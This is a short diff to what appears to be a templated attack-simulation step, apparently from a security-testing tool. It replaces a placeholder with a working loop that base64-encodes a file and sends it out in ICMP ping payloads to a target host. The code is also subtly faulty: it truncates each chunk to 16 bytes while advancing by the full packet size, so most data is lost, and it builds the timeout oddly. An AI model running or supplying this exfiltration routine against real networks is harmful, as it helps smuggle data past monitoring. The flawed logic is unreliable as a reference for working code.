@@ -75,9 +75,21 @@ steps:
       echo "  ping -c 1 -p <encoded_data> {{ .Args.target_host }}"
     else
       echo "ICMP tunnel exfiltration started..."
-      # This would implement actual ICMP tunneling
-      # Placeholder for actual implementation
-      echo "NOTE: Actual ICMP tunneling requires privileged access"
+      # Encode file data and embed in ICMP ping payloads
+      encoded=$(base64 < '{{ .Args.data_file }}' | tr -d '\n')
+      total=${#encoded}
+      offset=0
+      seq_num=0
+      payload_size={{ .Args.packet_size }}
+      while [ $offset -lt $total ]; do
+        chunk=$(echo "$encoded" | cut -c$((offset+1))-$((offset+payload_size)))
+        # Convert chunk to hex for ping -p pattern
+        hex_pattern=$(echo -n "$chunk" | xxd -p | head -c 32)
+        ping -c 1 -W {{ .Args.ping_timeout }}000 -s {{ .Args.packet_size }} -p "$hex_pattern" '{{ .Args.target_host }}' 2>/dev/null || true
+        seq_num=$((seq_num + 1))
+        offset=$((offset + payload_size))
+      done
+      echo "ICMP exfiltration complete: sent ${seq_num} ping packets"
     fi
   cleanup:
     inline: rm -f /tmp/test_icmp.dat
